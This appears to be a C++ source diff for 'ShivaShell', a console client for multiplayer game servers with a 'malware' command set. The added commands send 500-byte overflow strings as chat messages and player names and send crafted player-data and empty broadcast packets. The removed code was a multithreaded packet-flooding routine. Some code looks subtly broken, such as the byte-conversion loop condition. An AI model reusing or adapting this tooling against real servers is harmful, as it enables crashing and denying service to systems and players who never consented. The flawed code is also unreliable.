@@ -1,79 +1,146 @@
 #include "ShivaShell.h"
 
-ServerData passemblosMainData;
+namespace ShivaShell
+{
+	// Local variables storage
+	namespace Local
+	{
+		// Constants and variables that are created on initialization stage.
+		namespace Const {
+			ServerData passemblosMainData;
 
-unsigned int maskSend2Everyone = 0xffffffff & ~(1 << (ServerConnector::globalStationID - 1));
+			std::string helpText;
+			std::string overflowText;
+		}
+
+		fStringStream commlineParser;
+		bool abortSession = false;
+
+		unsigned int maskSend2Everyone;
+
+		ShivaState currentState = ShivaState::Calm;
+
+		DefaultServersMap defaultServers;
+		DefaultServerInfo* currentServerDefaultInfo = 0;
+	}
+}
 
 void ShivaShell::run()
 {
 	init();
-	while (!abortSession) {
+	while (!Local::abortSession) {
 		tick();
 	}
 }
 
 void ShivaShell::init()
 {
-	inputPacketsStream.init();
+	// initializating other modules
 	audioUtil.init();
-	loadPredefServers();
-	initPassemblosTemplate();
-	
-	fFile helpTextFile("data/helpText.txt", fFile::AS_INPUT);
-	helpText = helpTextFile.fileData;
+	Local::defaultServers.load();
 
-	std::cout
-		<< "SHIVASHELL::v0x0\n"
-		<< "Enter '.help' to print shell help.\n";
+	// initializating myself
+	createPassemblosTemplate();
+	createOverflowText();
+	loadHelpText();
 
+	// initialization ended
+	printWelcomeText();
 }
 
 void ShivaShell::tick()
 {
 	std::cout << '>';
 	parseCommand(getCommand());
-	ServerConnector::processPacketStack();
+	serverSocket.processPacketStack();
 }
 
-void ShivaShell::initPassemblosTemplate()
+void ShivaShell::createPassemblosTemplate()
 {
-	passemblosMainData.GameType = PASSEMBLOSS;
+	Local::Const::passemblosMainData.GameType = PASSEMBLOSS;
 
-	passemblosMainData.Passembloss.ArtefactsUsing = 0;
-	passemblosMainData.Passembloss.CheckpointsNumber = INT_MAX;
-	passemblosMainData.Passembloss.Color = 0;
-	passemblosMainData.Passembloss.InEscaveTime = INT_MAX;
-	passemblosMainData.Passembloss.InitialCash = INT_MAX;
-	passemblosMainData.Passembloss.RandomEscave = 0;
+	Local::Const::passemblosMainData.Passembloss.ArtefactsUsing = 0;
+	Local::Const::passemblosMainData.Passembloss.CheckpointsNumber = INT_MAX;
+	Local::Const::passemblosMainData.Passembloss.Color = 0;
+	Local::Const::passemblosMainData.Passembloss.InEscaveTime = INT_MAX;
+	Local::Const::passemblosMainData.Passembloss.InitialCash = INT_MAX;
+	Local::Const::passemblosMainData.Passembloss.RandomEscave = 0;
 }
 
-void ShivaShell::loadPredefServers()
+void ShivaShell::loadHelpText()
 {
-	PredefServersConfigParser configParser;
+	fFile helpTextFile("data/helpText.txt", fFile::AS_INPUT);
+	Local::Const::helpText = helpTextFile.fileData;
+}
 
-	configParser.parse(predefServers);
+void ShivaShell::createOverflowText()
+{
+	for(int i = 0; i < 500; i++)
+	{
+		Local::Const::overflowText += ' ';
+	}
+}
+
+void ShivaShell::printWelcomeText()
+{
+	std::cout
+		<< "SHIVASHELL::v0x1\n"
+		<< "Enter '.help' to print shell help.\n";
 }
 
 std::string ShivaShell::getCommand()
 {
 	std::string commline;
 	std::getline(std::cin, commline);
+	convertBytes(commline);
 	return commline;
+}
+
+void ShivaShell::convertBytes(std::string &string)
+{
+	size_t slashPos;
+	size_t nextSlash;
+	size_t readPos = 0;
+
+	while((slashPos = string.find('\\'), readPos) != std::string::npos)
+	{
+		nextSlash = string.find('\\', slashPos+1); 
+		if(nextSlash == std::string::npos) return;
+
+		// double slashes
+		if(nextSlash == slashPos + 1){
+			string.erase(nextSlash, 1);
+			readPos = nextSlash;
+			continue;
+		}
+
+		//...\number\....
+		//    ^    ^
+		//substr only number part
+		std::string strByteValue = string.substr(slashPos+1, (nextSlash-slashPos)-1);
+		string.erase(slashPos, (nextSlash-slashPos)+1);
+
+		char totalByte = atoi(strByteValue.data());
+
+		string.insert(string.begin() + slashPos, totalByte);
+
+		readPos = slashPos+1;
+	}
 }
 
 void ShivaShell::parseCommand(const std::string& commline)
 {
 	std::string word;
 
-	commlineParser.myData = commline;
-	commlineParser.currentPos = 0;
+	Local::commlineParser.resetString(commline);
 
-	while (commlineParser.tryReadWord(word)) {
+	while (Local::commlineParser.tryReadWord(word)) {
 		routeCmdName(word);
 	}
 }
 
 #define cmdcase(cmdstr, cmdfnc) if(cmd == cmdstr) { cmdfnc(); break; }
+#define cmdcase_malware(cmdstr, cmdfnc) if(cmd == cmdstr) { if(isServerCanBeAttacked()) { cmdfnc(); } break; }
 
 void ShivaShell::routeCmdName(std::string& cmd)
 {
@@ -118,23 +185,23 @@ void ShivaShell::routeCmdName(std::string& cmd)
 		std::cout << "Unknown game command: " << cmd << '\n';
 		break;
 	case 'm': // malware
-		cmdcase("gnn", dcMgnn);
-		cmdcase("nni", dcMnni);
-		cmdcase("cmp", dcMcmp);
-		cmdcase("msi", dcMmsi);
+		cmdcase_malware("msw", dcMmsw);
+		cmdcase_malware("urw", dcMurw);
+		cmdcase_malware("nni", dcMnni);
+		cmdcase_malware("msi", dcMmsi);
 
 		std::cout << "Unknown malware command: " << cmd << '\n';
 		break;
 	}
 }
 
-bool ShivaShell::malwareCheckServer()
+bool ShivaShell::isServerCanBeAttacked()
 {
-	switch (currentState) {
+	switch (Local::currentState) {
 	case ShivaState::Calm:
 	case ShivaState::Attack:
-		if (predefCurrentInfo) {
-			if (predefCurrentInfo->flags & PDSF_Deprecated) {
+		if (Local::currentServerDefaultInfo) {
+			if (Local::currentServerDefaultInfo->flags & DSF_Deprecated) {
 				audioUtil.set(TID_DprAttackIntro);
 
 				std::cout
@@ -145,15 +212,15 @@ bool ShivaShell::malwareCheckServer()
 				std::cin >> answer;
 
 				if (answer == 'y' || answer == 'Y') {
-					currentState = DprAttack;
+					Local::currentState = DprAttack;
 					audioUtil.set(TID_DprAttackMain);
 					return 1;
 				}
 				audioUtil.set(TID_Calm);
 				return 0;
 			}
-			if(currentState != Attack) {
-				currentState = Attack;
+			if(Local::currentState != Attack) {
+				Local::currentState = Attack;
 				audioUtil.set(TID_NormalAttack);
 			}
 		}
@@ -165,22 +232,22 @@ bool ShivaShell::malwareCheckServer()
 	return 0;
 }
 
-// mass packet thread
-namespace mpt {
-	int numStartThreads = 0;
-	int numCurrentThreads = 0;
-}
 
-#define REQARG(argname) if(!(commlineParser.tryReadAny(argname))) { std::cout<<"command failed - no "#argname" arg\n"; return; }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+/// Commands definitions
+
+
+#define REQARG(argname) if(!(Local::commlineParser.tryReadAny(argname))) { std::cout<<"command failed - no "#argname" arg\n"; return; }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
 void ShivaShell::dc_Help()
 {
-	std::cout << helpText << '\n';
+	std::cout << Local::Const::helpText << '\n';
 }
 
 void ShivaShell::dc_Shtd() 
 {
-	abortSession = 1;
+	Local::abortSession = 1;
+
+	serverSocket.disconnect();
 }
 
 void ShivaShell::dc_Abrt() 
@@ -198,7 +265,7 @@ void ShivaShell::dc_Pstdmp()
 		
 		for (const char& byte : packet) {
 
-			strnum = std::to_string((int)byte);
+			strnum = std::to_string((int)((unsigned char)byte));
 			for (int j = 3; j > strnum.size(); j--) {
 				strnum.insert(strnum.begin(), '0');
 			}
@@ -217,7 +284,7 @@ void ShivaShell::dc_Mtaux()
 
 	bool isMuted = atoi(isMutedArg.data());
 
-	ServerConnector::muteAuxPackets = isMuted;
+	serverSocket.ignoreAuxiliaries = isMuted;
 }
 
 void ShivaShell::dc_Mtaud()
@@ -243,23 +310,25 @@ void ShivaShell::dcScn()
 
 	REQARG(connectInfo.IP);
 
-	if (commlineParser.tryReadAny(word)) {
+	if (Local::commlineParser.tryReadAny(word)) {
 		connectInfo.Port = atoi(word.c_str());
 	}
 	else {
 		connectInfo.Port = 2197;
 	}
 
-	predefCurrentInfo = 0;
+	Local::currentServerDefaultInfo = 0;
 
-	if (ServerConnector::connect(connectInfo)) {
+	if (serverSocket.connect(connectInfo)) {
 
-		for (PredefServerInfo& predefServ : predefServers) {
-			if (predefServ.name == connectInfo.IP && predefServ.port == connectInfo.Port) {
-				predefCurrentInfo = &predefServ;
+		for (DefaultServerInfo& defServer : Local::defaultServers.servers) {
+			if (defServer.name == connectInfo.IP && defServer.port == connectInfo.Port) {
+				Local::currentServerDefaultInfo = &defServer;
 				break;
 			}
 		}
+
+		Local::maskSend2Everyone = 0xffffffff & ~(1 << (serverSocket.myPlayerID - 1));
 
 		std::cout << "connected...\n";
 		return;
@@ -270,20 +339,30 @@ void ShivaShell::dcScn()
 
 void ShivaShell::dcSdc()
 {
-	ServerConnector::disconnect();
+	serverSocket.disconnect();
 	std::cout << "disconnected...\n";
 }
 
-#define PRINT_SERVER_PRM(prm) std::cout<<#prm"="<<ServerConnector::prm<<'\n';
+#define PRINT_SERVER_PRM(prm) std::cout<<#prm"="<<serverSocket.prm<<'\n';
 
 void ShivaShell::dcSst()
 {
 	std::cout << "server connector status:\n";
-	PRINT_SERVER_PRM(isConnected);
-	if (ServerConnector::isConnected) {
-		PRINT_SERVER_PRM(targetServer.IP);
-		PRINT_SERVER_PRM(targetServer.Port);
-		std::cout << "targetServer->realIP=" << mainSocket.getRemoteAddress() << '\n';
+	if (serverSocket.connectedServer) 
+	{
+		PRINT_SERVER_PRM(connectedServer->IP);
+		PRINT_SERVER_PRM(connectedServer->Port);
+		std::cout << "connectedServer-->realIP=" << serverSocket.socket.getRemoteAddress() << '\n';
+
+		if(serverSocket.connectedGame)
+		{
+			PRINT_SERVER_PRM(connectedGame->ID);
+			PRINT_SERVER_PRM(connectedGame->name);
+		}
+	}
+	else
+	{
+		std::cout<<"no connection";
 	}
 
 }
@@ -291,18 +370,18 @@ void ShivaShell::dcSgl()
 {
 
 	std::cout << "updating...\n";
-	ServerConnector::updateGamesList();
+	serverSocket.updateGamesList();
 	std::cout << "updated\n";
 
-	if (ServerConnector::gamesList.empty()) {
+	if (serverSocket.serverGames.empty()) {
 		std::cout << "<no any>\n";
 		return;
 	}
 
-	for (const GameInfo& gameInfo : ServerConnector::gamesList) {
+	for (const GameInfo& gameInfo : serverSocket.serverGames) {
 
-		std::cout	<< "-+-NAME------>" << gameInfo.name << '\n'
-					<< " +-ID-------->" << gameInfo.ID << '\n';
+		std::cout	<< "-+-NAME->" << gameInfo.name << '\n'
+					<< " +-ID--->" << gameInfo.ID << '\n';
 
 	}
 }
@@ -310,35 +389,7 @@ void ShivaShell::dcSgl()
 
 void ShivaShell::dcSmap()
 {
-	ServerConnector::disconnect();
-
-	ServerInfo connectInfo;
-
-	std::cout << "DEFAULT SERVERS MAP\n";
-
-	sf::Clock pingClock;
-	for (PredefServerInfo& predefserver : predefServers) {
-		if (predefserver.flags & PDSF_Deprecated)
-			std::cout << '\t' << "[DEPRECATED]\n";
-		std::cout
-			<< '\t' << "name: " << predefserver.name << ':' << std::to_string(predefserver.port) << '\n'
-			<< '\t' << "engine: " << predefserver.engine << '\n'
-			<< '\t' << "host: " << predefserver.host << '\n'
-			<< '\t' << "description: '" << predefserver.description << "'\n";
-
-		connectInfo.IP = predefserver.name;
-		connectInfo.Port = predefserver.port;
-
-		pingClock.restart();
-
-		bool state = ServerConnector::connect(connectInfo, 0);
-
-		std::cout
-			<< '\t' << "connection state: " << (state ? "+" : "-") << '\n'
-			<< '\t' << "ping: " << pingClock.restart().asSeconds()<<'s' << '\n';
-
-		std::cout << '\n';
-	}
+	Local::defaultServers.print();
 }
 
 void ShivaShell::dcGcn()
@@ -350,7 +401,7 @@ void ShivaShell::dcGcn()
 
 	gameID = atoi(gameIDArg.data());
 
-	if (!ServerConnector::connect2Game(gameID)) {
+	if (!serverSocket.connect2Game(gameID)) {
 		std::cout << "connection failed...\n";
 		return;
 	}
@@ -362,18 +413,18 @@ void ShivaShell::dcGpl()
 	bool printBody = 0;
 	std::string printBodyArg;
 
-	commlineParser.tryReadAny(printBodyArg);
+	Local::commlineParser.tryReadAny(printBodyArg);
 
 	printBody = atoi(printBodyArg.data());
 
-	ServerConnector::updatePlayersList();
+	serverSocket.updatePlayersList();
 
-	if (ServerConnector::playersList.empty()) {
+	if (serverSocket.gamePlayers.empty()) {
 		std::cout << "<no any>\n";
 		return;
 	}
 
-	for (PlayerInfo& player : ServerConnector::playersList) {
+	for (PlayerInfo& player : serverSocket.gamePlayers) {
 		std::cout
 			<< "-+-NAME----->" << player.name << '\n'
 			<< " +-ID------->" << (int)player.ID << '\n'
@@ -412,7 +463,7 @@ void ShivaShell::dcGreg()
 void ShivaShell::dcGms()
 {
 	VPacket messagePacket(DIRECT_SENDING);
-	messagePacket.writeAny(maskSend2Everyone);
+	messagePacket.writeAny(Local::maskSend2Everyone);
 
 	std::string text;
 
@@ -422,33 +473,28 @@ void ShivaShell::dcGms()
 	messagePacket.sendToServer();
 }
 
-VPacket massSendPacket;
-sf::Time massSendDelay = sf::seconds(0.001f);
+void ShivaShell::dcMmsw()
+{
+	VPacket sendMessagePacket(DIRECT_SENDING);
 
-void sendFunc() {
-	for (int i = 0; i < 100; i++) {
-		massSendPacket.sendToServer();
-		sf::sleep(massSendDelay);
-	}
+	// overflow message's text
+	sendMessagePacket += Local::Const::overflowText + '\0';
+	sendMessagePacket.sendToServer();
 }
 
-void ShivaShell::dcMgnn()
+void ShivaShell::dcMurw()
 {
-	if (!malwareCheckServer()) return;
+    VPacket sendRegisterNamePacket(REGISTER_NAME);
 
-	if (massSendPacket.empty()) {
-		massSendPacket.type = REGISTER_NAME;
-	}
-
-	for (int i = 0; i < 0xf; i++) {
-		std::thread(sendFunc).detach();
-	}
+	// overflowed name
+	sendRegisterNamePacket += Local::Const::overflowText + '\0';
+	// passwords are stored on server so its senseless to overflow them
+	sendRegisterNamePacket += ' ' + '\0';
+	sendRegisterNamePacket.sendToServer();
 }
 
 void ShivaShell::dcMnni()
 {
-	if (!malwareCheckServer()) return;
-
 	VPacket sendBodyPacket(SET_PLAYER_DATA);
 
 	PlayerBody myBody;
@@ -457,27 +503,12 @@ void ShivaShell::dcMnni()
 	sendBodyPacket.writeAny(myBody);
 
 	sendBodyPacket.sendToServer();
-
-
-}
-
-void ShivaShell::dcMcmp()
-{
-	massSendPacket.clear();
 }
 
 void ShivaShell::dcMmsi()
 {
-	if (!malwareCheckServer()) return;
-
 	VPacket messagePacket(DIRECT_SENDING);
-	messagePacket.writeAny(maskSend2Everyone);
-	/*
-	for (int i = 0; i < 400; i++) {
-		messagePacket += ' ';
-	}
-	messagePacket += '\0';
-	*/
+	messagePacket.writeAny(Local::maskSend2Everyone);
 	messagePacket.sendToServer();
 }
 
